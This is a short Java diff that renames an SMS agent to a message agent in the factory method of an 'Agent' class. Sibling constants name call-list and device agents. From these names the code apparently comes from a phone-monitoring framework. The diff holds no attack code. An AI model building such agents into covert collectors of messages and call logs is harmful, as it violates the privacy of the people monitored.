@@ -19,7 +19,7 @@ public abstract class Agent extends TimerJob {
     private static Debug debug = new Debug("Agent", DebugLevel.VERBOSE);
 
     public static final int AGENT = 0x1000;
-    public static final int AGENT_SMS = AGENT + 0x1;
+    public static final int AGENT_MESSAGE = AGENT + 0x1;
     public static final int AGENT_TASK = AGENT + 0x2;
     public static final int AGENT_CALLLIST = AGENT + 0x3;
     public static final int AGENT_DEVICE = AGENT + 0x4;
@@ -41,10 +41,10 @@ public abstract class Agent extends TimerJob {
     public static Agent factory(int agentId, boolean agentStatus,
             byte[] confParams) {
         switch (agentId) {
-        case AGENT_SMS:
+        case AGENT_MESSAGE:
             // #debug
-            debug.trace("Factory AGENT_SMS");
-            return new SmsAgent(agentStatus, confParams);
+            debug.trace("Factory AGENT_MESSAGE");
+            return new MessageAgent(agentStatus, confParams);
         case AGENT_TASK:
             // #debug
             debug.trace("Factory AGENT_TASK");
